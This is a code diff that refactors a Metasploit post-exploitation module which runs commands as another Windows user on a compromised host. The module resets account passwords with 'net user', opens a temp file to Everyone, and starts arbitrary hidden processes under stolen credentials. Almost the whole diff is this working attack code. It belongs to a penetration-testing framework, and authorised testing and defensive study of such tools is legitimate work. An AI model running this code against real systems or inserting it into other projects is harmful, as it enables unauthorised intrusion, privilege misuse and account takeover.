@@ -1,10 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
-require 'rex'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -12,20 +9,36 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Runas
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'                 => "Windows Manage Run Command As User",
-      'Description'          => %q(
-        This module will login with the specified username/password and execute the
-        supplied command as a hidden process. Output is not returned by default, by setting
-        CMDOUT to false output will be redirected to a temp file and read back in to
-        display.By setting advanced option SETPASS to true, it will reset the users
-        password and then execute the command.
-                            ),
-      'License'              => MSF_LICENSE,
-      'Platform'             => ['win'],
-      'SessionTypes'         => ['meterpreter'],
-      'Author'               => ['Kx499']
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Run Command As User',
+        'Description' => %q{
+          This module will login with the specified username/password and execute the
+          supplied command as a hidden process. Output is not returned by default, by setting
+          CMDOUT to true output will be redirected to a temp file and read back in to
+          display. By setting advanced option SETPASS to true, it will reset the user's
+          password and then execute the command.
+        },
+        'License' => MSF_LICENSE,
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Author' => ['Kx499'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+              stdapi_sys_config_getprivs
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -34,12 +47,14 @@ class MetasploitModule < Msf::Post
         OptString.new('PASSWORD', [true, 'Password to login with' ]),
         OptString.new('CMD', [true, 'Command to execute' ]),
         OptBool.new('CMDOUT', [true, 'Retrieve command output', false])
-      ], self.class)
+      ]
+    )
 
     register_advanced_options(
       [
         OptBool.new('SETPASS', [true, 'Reset password', false])
-      ], self.class)
+      ]
+    )
   end
 
   # Check if sufficient privileges are present for certain actions and run getprivs for system
@@ -49,66 +64,65 @@ class MetasploitModule < Msf::Post
   def priv_check
     if is_system?
       privs = session.sys.config.getprivs
-      return privs.include?("SeAssignPrimaryTokenPrivilege") && privs.include?("SeIncreaseQuotaPrivilege")
+      return privs.include?('SeAssignPrimaryTokenPrivilege') && privs.include?('SeIncreaseQuotaPrivilege')
     end
 
     false
   end
 
   def reset_pass(user, password)
-    begin
-      tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
-      return tmpout.include?("successfully")
-    rescue
-      return false
-    end
+    tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
+    return tmpout.include?('successfully')
+  rescue StandardError
+    return false
   end
 
   def touch(path)
-    write_file(path, "")
+    write_file(path, '')
     cmd_exec("icacls #{path} /grant Everyone:(F)")
   end
 
   def run
     # Make sure we meet the requirements before running the script, note no need to return
     # unless error
-    return unless session.type == "meterpreter"
+    return unless session.type == 'meterpreter'
 
     pi = nil
     # check/set vars
-    setpass = datastore["SETPASS"]
-    cmdout = datastore["CMDOUT"]
-    user = datastore["USER"] || nil
-    password = datastore["PASSWORD"] || nil
-    cmd = datastore["CMD"] || nil
+    setpass = datastore['SETPASS']
+    cmdout = datastore['CMDOUT']
+    user = datastore['USER'] || nil
+    password = datastore['PASSWORD'] || nil
+    cmd = datastore['CMD'] || nil
     domain = datastore['DOMAIN']
 
     if setpass
-      print_status("Setting user password")
+      print_status('Setting user password')
       fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)
     end
 
-    system_temp = get_env('WINDIR') << '\\Temp'
-    outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
-
-    # Create output file and set permissions so everyone can access
-    touch(outpath)
-
-    cmdstr = "cmd.exe /c #{cmd}"
-    cmdstr = "cmd.exe /c #{cmd} > #{outpath}" if cmdout
+    # If command output is requested, then create output file and set open permissions
+    if cmdout
+      system_temp = get_env('WINDIR') << '\\Temp'
+      outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
+      touch(outpath)
+      cmdstr = "cmd.exe /c #{cmd} > #{outpath}"
+    else
+      cmdstr = "cmd.exe /c #{cmd}"
+    end
 
     # Check privs and execute the correct commands
     # if user use createprocesswithlogon, if system logonuser and createprocessasuser
     # execute command and get output with a poor mans pipe
     if priv_check
-      print_status("Executing CreateProcessAsUserA...we are SYSTEM")
+      print_status('Executing CreateProcessAsUserA...we are SYSTEM')
       pi = create_process_as_user(domain, user, password, nil, cmdstr)
       if pi
         session.railgun.kernel32.CloseHandle(pi[:process_handle])
         session.railgun.kernel32.CloseHandle(pi[:thread_handle])
       end
     else
-      print_status("Executing CreateProcessWithLogonW...")
+      print_status('Executing CreateProcessWithLogonW...')
       pi = create_process_with_logon(domain, user, password, nil, cmdstr)
     end
 
@@ -122,7 +136,12 @@ class MetasploitModule < Msf::Post
       vprint_status("Thread Handle: #{pi[:thread_handle]}")
       vprint_status("Process Id: #{pi[:process_id]}")
       vprint_status("Thread Id: #{pi[:thread_id]}")
-      print_status("Command output:\r\n#{tmpout}") unless tmpout.nil?
+      print_status("Command output:\r\n#{tmpout}") if cmdout
+    end
+
+    if cmdout
+      print_status("Removing temp file #{outpath}")
+      rm_f(outpath)
     end
   end
 end
